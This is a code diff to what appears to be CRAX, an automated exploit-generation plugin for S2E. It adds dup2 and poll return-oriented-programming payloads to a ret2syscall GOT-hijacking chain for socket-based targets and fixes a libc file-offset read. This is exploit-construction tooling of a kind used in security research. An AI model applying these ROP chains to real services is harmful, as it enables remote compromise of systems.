@@ -20,6 +20,7 @@
 
 #include <s2e/Plugins/CRAX/CRAX.h>
 #include <s2e/Plugins/CRAX/Exploit.h>
+#include <s2e/Plugins/CRAX/Proxy.h>
 #include <s2e/Plugins/CRAX/Techniques/Ret2csu.h>
 
 #include <cassert>
@@ -183,6 +184,7 @@ std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingLibcRop() const {
 std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingGotHijackingRop() const {
     const Exploit &exploit = g_crax->getExploit();
     const ELF &elf = exploit.getElf();
+    const Proxy &proxy = g_crax->getProxy();
 
     auto ret2csu = g_crax->getTechnique<Ret2csu>();
     assert(ret2csu);
@@ -223,8 +225,31 @@ std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingGotHijackingRop() con
 
     ret1.reserve(1 + part1.size() + part2.size() + part3.size() + part4.size());
     ret1.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
+
+    // If the input source is socket, then dup the target socket to stdin.
+    if (proxy.getType() == Proxy::Type::SYM_SOCKET) {
+        RopPayload dup = getDup2RopPayload(proxy.getSocketFd());
+        ret1.insert(ret1.end(), dup.begin(), dup.end());
+
+        if (!proxy.isBlockingSocket()) {
+            RopPayload poll = getPollRopPayload();
+            ret1.insert(ret1.end(), poll.begin(), poll.end());
+        }
+    }
+
     ret1.insert(ret1.end(), part1.begin(), part1.end());
     ret1.insert(ret1.end(), part2.begin(), part2.end());
+
+    if (proxy.getType() == Proxy::Type::SYM_SOCKET) {
+        if (!proxy.isBlockingSocket()) {
+            RopPayload poll = getPollRopPayload();
+            ret1.insert(ret1.end(), poll.begin(), poll.end());
+
+            // Reset RAX to 0.
+            ret1.insert(ret1.end(), part2.begin(), part2.end());
+        }
+    }
+
     ret1.insert(ret1.end(), part3.begin(), part3.end());
     ret1.insert(ret1.end(), part4.begin(), part4.end());
     ret2 = { ByteVectorExpr::create(std::vector<uint8_t> { getLibcReadSyscallOffsetLsb() }) };
@@ -241,18 +266,58 @@ uint8_t Ret2syscall::getLibcReadSyscallOffsetLsb() const {
 
     std::vector<uint8_t> code(f.size);
     std::ifstream ifs(libc.getFilename(), std::ios::binary);
-    ifs.seekg(f.address, std::ios::beg);
+    ifs.seekg(f.offset, std::ios::beg);
     ifs.read(reinterpret_cast<char*>(code.data()), f.size);
 
     uint64_t syscallOffset = -1;
-    for (auto i : disas().disasm(code, f.address)) {
+    for (auto i : disas().disasm(code, f.offset)) {
         if (i.mnemonic == "syscall") {
             syscallOffset = i.address;
-            assert((syscallOffset & 0xff00) == (f.address & 0xff00));
+            assert((syscallOffset & 0xff00) == (f.offset & 0xff00));
             break;
         }
     }
     return syscallOffset & 0xff;
+}
+
+RopPayload Ret2syscall::getDup2RopPayload(int socketFd) const {
+    const Exploit &exploit = g_crax->getExploit();
+    const ELF &elf = exploit.getElf();
+
+    auto ret2csu = g_crax->getTechnique<Ret2csu>();
+    assert(ret2csu);
+
+    return ret2csu->getRopPayloadList(
+        BaseOffsetExpr::create<BaseType::SYM>(elf, "dup2"),
+        ConstantExpr::create(socketFd, Expr::Int64),
+        ConstantExpr::create(0, Expr::Int64),
+        ConstantExpr::create(0, Expr::Int64))[0];
+}
+
+RopPayload Ret2syscall::getPollRopPayload() const {
+    const Exploit &exploit = g_crax->getExploit();
+    const ELF &elf = exploit.getElf();
+
+    auto ret2csu = g_crax->getTechnique<Ret2csu>();
+    assert(ret2csu);
+
+    for (const auto &[symbol, func] : elf.functions()) {
+        uint64_t addr = elf.getRuntimeAddress(func.offset);
+        std::vector<uint8_t> code = mem().readConcrete(addr, func.size);
+
+        for (auto i : disas().disasm(code, func.offset)) {
+            if (g_crax->isCallSiteOf(i, "poll")) {
+                log<WARN>() << "Polling socket via " << symbol << '\n';
+                return ret2csu->getRopPayloadList(
+                    BaseOffsetExpr::create<BaseType::SYM>(elf, symbol),
+                    ConstantExpr::create(-1, Expr::Int64),
+                    ConstantExpr::create(0, Expr::Int64),
+                    ConstantExpr::create(0, Expr::Int64))[0];
+            }
+        }
+    }
+
+    return {};
 }
 
 }  // namespace s2e::plugins::crax
